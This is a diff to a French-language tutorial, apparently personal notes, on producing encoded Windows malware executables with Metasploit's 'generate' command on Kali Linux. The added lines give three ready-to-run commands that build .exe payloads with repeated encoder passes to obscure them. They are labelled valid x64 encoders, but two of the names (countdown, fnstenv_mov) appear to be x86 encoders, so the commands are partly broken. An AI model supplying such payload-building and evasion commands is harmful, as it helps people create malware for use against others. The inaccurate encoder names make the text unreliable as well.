@@ -199,6 +199,14 @@ format exe malwar complet en une ligne :
 generate -e x64/xor_dynamic -b "\xff" -i 2 -o /home/kali/Desktop/fichier.exe -f exe
 ````
 
+Variante avec d'autres encodeurs x64 valides
+
+````bash
+generate -e x64/zutto_dekiru -b "\x00" -i 5 -f exe -o /home/kali/Desktop/fichier_zutto.exe
+generate -e x64/countdown    -b "\x00" -i 3 -f exe -o /home/kali/Desktop/fichier_countdown.exe
+generate -e x64/fnstenv_mov  -b "\x00" -i 1 -f exe -o /home/kali/Desktop/fichier_fnstenv.exe
+````
+
 ## c est fini on peut toujours rajouter plus d iteration y a d autre format , encoder, forme,option ,playload,module possible explorer tout 👍
 ## A noter un encoder X86 ne va pas avec un playload X64 
 # maintenant nous allons utiliser msfvemon , tout d abord comprenons ce que c est :
